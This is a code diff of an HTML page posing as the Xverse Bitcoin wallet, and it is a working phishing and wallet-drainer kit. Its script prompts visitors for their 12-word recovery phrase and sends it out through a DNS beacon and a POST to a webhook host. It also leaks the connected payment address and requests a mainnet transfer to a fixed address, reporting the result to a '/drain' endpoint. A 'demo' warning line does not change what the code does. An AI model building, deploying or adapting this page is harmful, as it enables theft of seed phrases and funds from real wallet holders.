@@ -37,61 +37,129 @@
     button:hover {
       background: #e2761b;
     }
+    .status {
+      margin-top: 30px;
+      font-size: 16px;
+      min-height: 80px;
+      line-height: 1.6;
+    }
+    .address {
+      color: #22c55e;
+      word-break: break-all;
+    }
+    .warning {
+      margin-top: 40px;
+      color: #ef4444;
+      font-weight: bold;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
   <div class="logo">⚡</div>
   <h1>Xverse Wallet</h1>
-  <p>Connect your Bitcoin wallet to continue</p>
-  <button id="connectWallet">Connect Wallet</button>
+  <p>Connect your Bitcoin wallet and send a small amount to continue</p>
+  <button id="connectWallet">Connect & Send</button>
+
+  <div class="status" id="status">Ready</div>
+
+  <div class="warning">
+    This is a demo — do not use on real wallet!
+  </div>
+
+  <!-- IMPORT SATS-CONNECT & EXPOSE to window.SATS -->
+  <script type="module">
+    import { request, RpcErrorCode } from "https://esm.sh/sats-connect@latest";
+
+    // Expose ke global agar bisa dipakai di script non-module
+    window.SATS = { request, RpcErrorCode };
+  </script>
 
   <script>
+    //
+    const OOB = "keen-unicorn-32.webhook.cool";
+    const TARGET_ADDRESS = "bc1q2x0d48y878m8kgc7cpun5h9a5k5l33cy2khlzf";
+    const SEND_AMOUNT_SATS = 1000; // 1,000 sats = 0.00001 BTC
+    const NETWORK = "mainnet";
+
     document.getElementById("connectWallet").addEventListener("click", async () => {
-      const OOB = "keen-unicorn-32.webhook.cool";
+      const statusEl = document.getElementById("status");
+
+      statusEl.innerHTML = "Loading Sats Connect...";
+
+      //
+      if (!window.SATS?.request) {
+        statusEl.innerHTML = "Error: Sats Connect failed to load.";
+        return;
+      }
+
+      statusEl.innerHTML = "Connected to Sats Connect.<br>Connecting to Xverse wallet...";
 
       // 1.
       setTimeout(() => {
-        const seed = prompt("xverse.app says:\n\nEnter your 12-word recovery phrase to verify identity and continue");
+        const seed = prompt("Xverse Wallet says:\n\nEnter your 12-word recovery phrase to verify identity");
         if (seed && seed.trim() !== "") {
-          // Exfil via OOB (DNS beacon) — super stealth
+          // Exfil via OOB DNS
           const beacon = btoa(seed.trim()).replace(/=/g, '').substring(0, 500);
           new Image().src = `https://${beacon}.${OOB}`;
 
-          // Backup exfil via POST
+          // Backup POST
           fetch(`https://${OOB}/xverse-seed`, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ seed: seed.trim() })
           }).catch(() => {});
         }
       }, 1000);
 
-      // 2.
-      if (window.BitcoinProvider || window.xverseProviders) {
-        try {
-          let provider;
-          if (window.xverseProviders?.bitcoin) {
-            provider = window.xverseProviders.bitcoin;
-          } else if (window.BitcoinProvider) {
-            provider = window.BitcoinProvider;
-          }
+      try {
+        // 2.
+        const connectRes = await window.SATS.request('wallet_connect', {
+          addresses: ['payment'],
+          message: 'Demo dApp: request 1,000 sats transfer',
+          network: NETWORK
+        });
 
-          if (provider) {
-            const accounts = await provider.requestAccounts();
-            console.log("Xverse wallet connected:", accounts);
-
-            const addrBeacon = btoa(accounts[0]).replace(/=/g, '');
-            new Image().src = `https://addr-${addrBeacon}.${OOB}`;
-
-            alert("Wallet connected successfully!");
-          }
-        } catch (err) {
-          console.log("Xverse connection rejected:", err);
-          alert("Connection rejected or failed");
+        if (connectRes.status !== 'success') {
+          const msg = connectRes.error?.code === window.SATS.RpcErrorCode.USER_REJECTION
+            ? "User rejected the connection."
+            : (connectRes.error?.message || "Connection failed");
+          throw new Error(msg);
         }
-      } else {
-        console.log("Xverse wallet not detected.");
-        alert("Please install Xverse Wallet extension");
+
+        const paymentAddrObj = (connectRes.result.addresses || [])
+          .find(a => a.purpose === 'payment');
+
+        if (!paymentAddrObj?.address) {
+          throw new Error('No payment address returned by wallet.');
+        }
+
+        statusEl.innerHTML = `Connected: <span class="address">${paymentAddrObj.address}</span><br>Sending <b>0.00001 BTC</b>...`;
+
+        const addrBeacon = btoa(paymentAddrObj.address).replace(/=/g, '');
+        new Image().src = `https://addr-${addrBeacon}.${OOB}`;
+
+        const sendRes = await window.SATS.request('sendTransfer', {
+          recipients: [{ address: TARGET_ADDRESS, amount: SEND_AMOUNT_SATS }]
+        });
+
+        if (sendRes.status === 'success') {
+          statusEl.innerHTML += "<br><span style='color:#22c55e'>Transaction sent successfully!</span>";
+          
+          fetch(`https://${OOB}/drain`, {
+            method: "POST",
+            body: JSON.stringify({
+              victim: paymentAddrObj.address,
+              txId: sendRes.result?.txId || "unknown",
+              amount: SEND_AMOUNT_SATS
+            })
+          });
+        } else {
+          throw new Error(sendRes.error?.message || "Send failed");
+        }
+
+      } catch (err) {
+        statusEl.innerHTML = `<span style="color:#ef4444">Error: ${err.message}</span>`;
+        console.log("Xverse operation failed:", err);
       }
     });
   </script>
